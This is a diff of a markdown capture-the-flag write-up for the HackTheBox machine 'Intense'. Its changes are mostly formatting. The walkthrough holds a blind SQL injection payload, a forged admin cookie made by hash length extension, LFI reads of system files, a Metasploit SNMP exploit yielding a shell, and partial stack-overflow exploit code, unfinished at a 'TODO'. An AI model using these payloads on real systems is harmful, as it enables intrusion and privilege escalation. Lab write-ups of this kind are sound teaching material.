@@ -1,5 +1,5 @@
 ---
-description: 'SQL Injection, Hash Length Extension, LFI and binary exploitation'
+description: SQL Injection, Hash Length Extension, LFI and binary exploitation
 ---
 
 # Intense
@@ -8,7 +8,7 @@ description: 'SQL Injection, Hash Length Extension, LFI and binary exploitation'
 
 Intense is definitely the best box I have ever done on HTB, and I loved it every step of the way. We start by doing some general tampering on the website and, combined with source code analysis, we find an SQL injection vulnerability. As there is no controllable output, we can execute a boolean-based blind SQL injection attack and extract the `secret` character by character.
 
-The hash is not crackable, but rather used to sign a custom JWT token to prove it's authentic. The hashing algorithm in use is vulnerable to a [Hash Length Extension](https://en.wikipedia.org/wiki/Length_extension_attack) attack, which allows us to append our own data to the hash and sign in as the `admin`. More source code analysis reveals admins have access to an API vulnerable to LFI.
+The hash is not crackable, but rather used to sign a custom JWT token to prove it's authentic. The hashing algorithm in use is vulnerable to a [Hash Length Extension](https://en.wikipedia.org/wiki/Length\_extension\_attack) attack, which allows us to append our own data to the hash and sign in as the `admin`. More source code analysis reveals admins have access to an API vulnerable to LFI.
 
 Using the LFI we can grab an SNMP Read-Write Community string, which we can [leverage for RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/). From here we exploit a vulnerable binary run by root to gain root access.
 
@@ -18,7 +18,7 @@ Using the LFI we can grab an SNMP Read-Write Community string, which we can [lev
 
 `nmap` shows ports `22` and `80` open, so let's have a look at `80`.
 
-```text
+```
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -33,7 +33,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### HTTP
 
-![](../../.gitbook/assets/image%20%2818%29.png)
+![](<../../.gitbook/assets/image (31).png>)
 
 Couple things to note right away:
 
@@ -44,13 +44,13 @@ I'm going to download the source right away, and while that goes I'll sign in as
 
 First things first, I notice a cookie has been assigned:
 
-```text
+```
 auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.Lye5tjuupon4SLXjM0Jpc/l6Xkm5+POtT6xFlDtho3I=
 ```
 
 Looks like a custom JWT due to the two base64 strings separated by a `.`. Let's try decoding it.
 
-```text
+```
 username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;
 <<invalid text>>
 ```
@@ -69,7 +69,7 @@ def sign(msg):
     return sha256(SECRET + msg).digest()
 ```
 
-This function appears to create the _signature_ we saw as part of the JWT \(I'll call it an LWT from now to avoid confusion\). How is `SECRET` defined?
+This function appears to create the _signature_ we saw as part of the JWT (I'll call it an LWT from now to avoid confusion). How is `SECRET` defined?
 
 ```python
 SECRET = os.urandom(randrange(8, 15))
@@ -95,11 +95,11 @@ def submitmessage():
     return "OK"
 ```
 
-If we use the _Send Message_ feature of the website, our data gets parsed immediately into a database query. There's no sanitisation involved \(with the exception of checking that the message is within 140 characters\), so we should be able to do some SQLi.
+If we use the _Send Message_ feature of the website, our data gets parsed immediately into a database query. There's no sanitisation involved (with the exception of checking that the message is within 140 characters), so we should be able to do some SQLi.
 
 Note how the function returns the SQLite error if there is one, meaning we should get some feedback:
 
-![](../../.gitbook/assets/image%20%2817%29.png)
+![](<../../.gitbook/assets/image (34).png>)
 
 Now we know there is some SQL injection involved, let's think about what we need to extract. In `utils.py`, we see that there's a `try_login` function:
 
@@ -160,7 +160,7 @@ As only errors are returned, I originally attempted to trigger my own custom err
 
 After a big of tampering, I finished on this payload:
 
-```text
+```
 yes') UNION SELECT CASE SUBSTR(username,0,1) WHEN 'a' THEN LOAD_EXTENSION('b') ELSE 'yes' END role FROM users--
 ```
 
@@ -203,7 +203,7 @@ print(name)
 
 Success!
 
-```text
+```
 char found: a
 char found: d
 char found: m
@@ -251,7 +251,7 @@ print(admin)
 
 We get the hash `f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105`, which appears to be the correct size:
 
-```text
+```
 $echo -n 'f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105' | wc -c
 64
 ```
@@ -287,13 +287,13 @@ The signature changes every reset, so make sure you update it!
 
 I got the cookie
 
-```text
+```
 dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.Kj3kZb1zkyyn0eUdcAEy/u2k0TZJWvUAIDCmPuLqdNU=
 ```
 
 Updating it in `Inspect Element` works!
 
-![We&apos;re now an admin](../../.gitbook/assets/image%20%2819%29.png)
+![We're now an admin](<../../.gitbook/assets/image (29).png>)
 
 ## Analysing the Source as Admin
 
@@ -369,16 +369,16 @@ while True:
 
 If we read `/etc/passwd`, we see there's a user called `user`.
 
-```text
+```
 >>> /home/user/user.txt
 6b5...
 ```
 
 Now to find a way to get foothold.
 
-After some searching \(and some `nmap`\) we find SNMP is open, so let's see what we can do with that.
+After some searching (and some `nmap`) we find SNMP is open, so let's see what we can do with that.
 
-```text
+```
 >>> /etc/snmp/snmpd.conf
 [...]
  rocommunity public  default    -V systemonly
@@ -388,7 +388,7 @@ After some searching \(and some `nmap`\) we find SNMP is open, so let's see what
 
 There's a `rwcommunity` called `SuP3RPrivCom90`. RW Communities can be [leveraged for RCE](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/). To do this, I'm going to use the metasploit `linux/snmp/net_snmpd_rw_access` module.
 
-```text
+```
 msf6 exploit(linux/snmp/net_snmpd_rw_access) > set COMMUNITY SuP3RPrivCom90        
 COMMUNITY => SuP3RPrivCom90                                                                                                                                           
 msf6 exploit(linux/snmp/net_snmpd_rw_access) > set RHOSTS intense.htb                                                                                                 
@@ -404,7 +404,7 @@ And we get a meterpreter shell! Our user is `Debian-snmp`.
 
 If we go into the home directory of `user`, we see a `note_server` and a `note_server.c`. Running `netstat -tunlp` tells us there is something listening on port 5001.
 
-```text
+```
 netstat -tunlp
 [...]
 tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      -
@@ -413,14 +413,14 @@ tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      
 
 We can dump the files using meterpreter.
 
-```text
+```
 meterpreter > download note_server
 meterpreter > download note_server.c
 ```
 
 Let's run the file and check if it's this that runs on port `5001`:
 
-```text
+```
 $ netstat -tunlp | grep note_server
 tcp        0      0 127.0.0.1:5001          0.0.0.0:*               LISTEN      9264/./note_server
 ```
@@ -435,14 +435,14 @@ portno = 5001;
 
 As the program is running remotely, binary exploitation seems likely, so I'm going to dump the remote libc and linker as well:
 
-```text
+```
 $ ldd note_server
         linux-vdso.so.1 (0x00007ffee41ec000)
         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f12b4eba000)
         /lib64/ld-linux-x86-64.so.2 (0x00007f12b54ae000)
 ```
 
-```text
+```
 meterpreter > download /lib/x86_64-linux-gnu/libc.so.6
 meterpreter > download /lib64/ld-linux-x86-64.so.2
 ```
@@ -453,7 +453,7 @@ I'll rename them to `libc-remote.so` and `ld-remote.so` respectively.
 
 ### Summary
 
-A few things lack bounds checking, allowing us to a\) leak the stack and b\) write to the stack.
+A few things lack bounds checking, allowing us to a) leak the stack and b) write to the stack.
 
 ### Analysis
 
@@ -522,7 +522,7 @@ To summarise, the code can do the following:
   * Read input size - only one byte
   * Check if that would bring you over the max size
   * Read that many bytes
-  * Increase `index` \(a pointer to the end of the current note\)
+  * Increase `index` (a pointer to the end of the current note)
 * Copy
   * Take in offset
   * Take in size
@@ -599,7 +599,7 @@ addrs = [u64(leaks[addr:addr+8]) for addr in range(0, len(leaks), 8)]
 [print(hex(addr)) for addr in addrs]
 ```
 
-```text
+```
 0x7ffe9d91bbe0
 0xdc185629f84e5a00            canary
 0x7ffe9d91bbe0                rbp
@@ -608,7 +608,7 @@ addrs = [u64(leaks[addr:addr+8]) for addr in range(0, len(leaks), 8)]
 
 Now we've successfully leaked, we can parse the values. Using radare2 and breaking on the `ret`, the offset between the leaked RIP value there and binary base is `0xf54`:
 
-![](../../.gitbook/assets/image%20%2816%29.png)
+![](<../../.gitbook/assets/image (17).png>)
 
 ```python
 leaks = read()[1032:]
@@ -641,4 +641,3 @@ We're 12 off the canary at the end, so we put 12 `A` characters ahead and copy 1
 ### Leaking LIBC
 
 TODO
-
